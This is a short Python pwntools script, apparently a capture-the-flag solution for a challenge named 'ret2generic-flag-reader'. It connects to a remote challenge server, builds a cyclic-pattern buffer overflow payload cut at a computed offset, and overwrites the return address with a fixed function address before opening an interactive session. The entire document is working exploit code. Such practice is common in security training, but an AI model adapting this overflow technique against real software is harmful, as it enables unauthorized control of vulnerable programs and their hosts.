from pwn import *

#p = process("./ret2generic-flag-reader")
p = remote("mc.ax", 31077)
#input("attach gdb")

p.recv()

payload = cyclic(500)

payload = payload[:cyclic_find("kaaa")]
payload += p64(0x00000000004011f6)

p.sendline(payload)

p.interactive()
